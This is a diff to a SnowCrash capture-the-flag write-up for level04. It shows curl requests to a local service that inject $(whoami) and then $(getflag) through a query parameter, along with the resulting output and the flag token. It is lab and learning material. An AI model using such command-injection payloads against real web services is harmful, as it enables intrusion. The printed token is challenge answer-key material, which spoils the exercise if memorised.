@@ -30,7 +30,12 @@ level04
 
 Let's try to did it on the localhost:4747 !
 ```
-level04@SnowCrash:~$ curl localhost:4747?x=$(whoami)
-level04
+level04@SnowCrash:~$ curl localhost:4747?x='$(whoami)'
+flag04
 ```
-Ok, same thing :c
+Good, now let's get the flag:
+```
+level04@SnowCrash:~$ curl localhost:4747?x='$(getflag)'
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+```
+
